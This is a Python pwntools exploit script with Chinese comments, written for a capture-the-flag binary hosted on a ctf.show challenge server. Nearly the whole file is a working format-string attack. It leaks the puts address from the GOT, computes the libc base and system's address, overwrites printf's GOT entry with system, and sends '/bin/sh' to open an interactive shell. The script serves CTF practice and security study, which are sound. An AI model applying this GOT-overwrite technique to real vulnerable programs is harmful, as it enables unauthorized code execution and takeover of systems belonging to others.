from kk import*
context.binary = elf = ELF('./pwn')
context.log_level = 'debug'

# 根据是否远程自动选择 libc
if args.LIBC:
    libc = ELF('./libc.so.6')  # 远程给的libc
else:
    libc = ELF('/home/kk/libc-database/libs/libc6-i386_2.27-3ubuntu1_amd64/libc.so.6') #记得改

rop = ROP(elf)

def go():
    if args.KK:
        return remote('pwn.challenge.ctf.show', 28154)
    else:
        return process(elf.path)

def pwn():
    p = go()

    # 如果带有 GDB 参数，则附加调试器
    if args.GDB:
        # 这里可以写默认的断点，比如 b main\nc
        GDB(p, 'vmmap')

    # ================= 你的利用代码写这里 =================
    offset = 6
    printf_got = elf.got.printf

    payload = p32(elf.got.puts) + b'%6$s'  #puts 360  #printf b60
    p.send(payload)
    puts = u32(p.recvuntil(b'\xf7')[-4:])
    print(hex(puts))

    libc_base = puts - libc.symbols.puts
    print(hex(libc_base))
    system = libc_base + libc.symbols.system
    print(hex(system))

    payload = fmtstr_payload(offset,{printf_got:system}) 
    p.send(payload)

    pause()
    p.send(b"/bin/sh\x00")
    # ======================================================

    p.interactive()

if __name__ == "__main__":
    pwn()